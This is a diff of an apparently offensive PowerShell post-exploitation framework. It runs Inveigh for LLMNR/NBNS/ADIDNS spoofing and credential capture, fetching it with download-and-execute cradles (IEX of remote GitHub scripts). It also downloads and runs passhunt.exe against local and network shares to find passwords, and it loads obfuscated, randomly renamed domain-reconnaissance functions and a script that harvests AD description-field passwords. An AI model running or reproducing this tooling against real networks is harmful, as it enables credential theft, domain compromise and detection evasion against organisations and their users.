@@ -75,32 +75,30 @@ function pathCheck
         License: BSD 3-Clause
     #>
     #Dependency Check
-        $currentPath = (Get-Item -Path ".\" -Verbose).FullName
-        Write-Host 'Current Path is: '$currentPath''
-        
-        Write-Host -ForegroundColor Yellow 'Creating Log Folders in '$currentPath' directory:'
+        $currentPath = (Get-Item -Path ".\" -Verbose).FullName                
+        Write-Host -ForegroundColor Yellow 'Creating/Checking Log Folders in '$currentPath' directory:'
         
         if (Test-Path $currentPath\LocalRecon\)
         {
-            Write-Host -ForegroundColor Red ''$currentPath\Localrecon' already exists'
+            
         }
         else {mkdir $currentPath\LocalRecon\}
         
         if (Test-Path $currentPath\DomainRecon\)
         {
-            Write-Host -ForegroundColor Red ''$currentPath\Domainrecon' already exists'
+            
         }
         else {mkdir $currentPath\DomainRecon\;mkdir $currentPath\DomainRecon\ADrecon}
         
         if (Test-Path $currentPath\LocalPrivEsc\)
         {
-            Write-Host -ForegroundColor Red ''$currentPath\LocalPrivEsc\' already exists'
+            
         }
         else {mkdir $currentPath\LocalPrivEsc\}
         
         if (Test-Path $currentPath\Exploitation\)
         {
-            Write-Host -ForegroundColor Red ''$currentPath\Exploitation\' already exists'
+            
         }
         else {mkdir $currentPath\Exploitation\}
 
@@ -127,22 +125,22 @@ function Inveigh {
     {   
         if (isadmin)
         {
-                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory .\Inveighoutput.txt;}'
+                cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory $currentPath\;}'
         }
         else 
         {
-               invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory .\Inveighoutput.txt;}'
+               cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -ADIDNS Combo -ADIDNSThreshold 2 -FileOutput Y -FileOutputDirectory $currentPath\;}'
         }
     }
     else
     {
         if (isadmin)
         {
-                invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y -FileOutputDirectory .\Inveighoutput.txt;}'
+                cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -mDNS Y -HTTPS Y -Proxy Y -FileOutput Y -FileOutputDirectory $currentPath\;}'
         }
         else 
         {
-               invoke-expression 'cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString(''https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1'');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -FileOutputDirectory .\Inveighoutput.txt;}'
+               cmd /c start powershell -Command {$Wcl = new-object System.Net.WebClient;$Wcl.Proxy.Credentials = [System.Net.CredentialCache]::DefaultNetworkCredentials;IEX(New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/SecureThisShit/Creds/master/Inveigh.ps1');Invoke-Inveigh -ConsoleOutput Y -NBNS Y -FileOutput Y -FileOutputDirectory $currentPath\;}
         }
     }
 
@@ -329,17 +327,14 @@ function localreconmodules
                 Invoke-WebRequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/passhunt.exe' -Outfile $currentPath\passhunt.exe
                 copy .\passhunt.exe $Env:USERPROFILE
                 cmd /c start powershell -Command ".\passhunt.exe"
-                $sharepasshunt = Read-Host -Prompt 'Do you want to search for Passwords on this system using passhunt.exe? (Its worth it) (yes/no)'
+                $sharepasshunt = Read-Host -Prompt 'Do you also want to search for Passwords on all connected networkshares?'
                 if ($sharepasshunt -eq "yes" -or $sharepasshunt -eq "y" -or $sharepasshunt -eq "Yes" -or $sharepasshunt -eq "Y")
                 {
                     get-WmiObject -class Win32_Share | ft Path >> passhuntshares.txt
-                    $shares = get-content .\passhuntshares.txt | select-object -skip 4
-                    copy .\passhuntshares.txt $Env:TMP
-                    copy .\passhunt.exe $Env:TMP
-                    $temp = $Env:TMP
+                    $shares = get-content .\passhuntshares.txt | select-object -skip 4    
                     foreach ($line in $shares)
                     {
-                        cmd /c start powershell -Command "$temp\passhunt.exe -s $line"
+                        cmd /c start powershell -Command "$currentPath\passhunt.exe -s $line"
                     } 
                                       
                 }
@@ -488,8 +483,9 @@ function domainreconmodules
             misdirects >> "$currentPath\DomainRecon\NetForestDomain.txt"      
             odometer >> "$currentPath\DomainRecon\NetDomainController.txt"  
             Houyhnhnm >> "$currentPath\DomainRecon\NetUser.txt"    
-            Randal >> "$currentPath\DomainRecon\NetSystems.txt"   
-            Get-Printer >> "$currentPath\DomainRecon\NetPrinter.txt"
+            Randal >> "$currentPath\DomainRecon\NetSystems.txt"
+	    # Get-NetPrinter obfuscated
+            Get-Printer >> "$currentPath\DomainRecon\Printer.txt"
             damsels >> "$currentPath\DomainRecon\NetOU.txt"    
             xylophone >> "$currentPath\DomainRecon\NetSite.txt"  
             ignominies >> "$currentPath\DomainRecon\NetSubnet.txt"
@@ -497,8 +493,8 @@ function domainreconmodules
             confessedly >> "$currentPath\DomainRecon\NetGroupMember.txt"   
             aqueduct >> "$currentPath\DomainRecon\NetFileServer.txt" 
             marinated >> "$currentPath\DomainRecon\DFSshare.txt" 
-            merchandising >> "$currentPath\DomainRecon\DFSsharev1.txt"
-            visible >> "$currentPath\DomainRecon\DFSsharev2.txt"
+            #merchandising >> "$currentPath\DomainRecon\DFSsharev1.txt"
+            #visible >> "$currentPath\DomainRecon\DFSsharev2.txt"
             liberation >> "$currentPath\DomainRecon\NetShare.txt" 
             cherubs >> "$currentPath\DomainRecon\NetLoggedon"
             Trojans >> "$currentPath\DomainRecon\Domaintrusts.txt"
@@ -509,7 +505,8 @@ function domainreconmodules
             #Search for AD-Passwords in description fields
             [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
             Invoke-Webrequest -Uri 'https://github.com/SecureThisShit/Creds/raw/master/Microsoft.ActiveDirectory.Management.dll' -Outfile "$currentPath\Microsoft.ActiveDirectory.Management.dll"
-            iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
+            Import-Module .\Microsoft.ActiveDirectory.Management.dll
+	    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/adpass.ps1')
             thyme >> "$currentPath\DomainRecon\Passwords_in_description.txt"
 
 	        iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/SecureThisShit/Creds/master/obfuscatedps/viewdev.ps1')
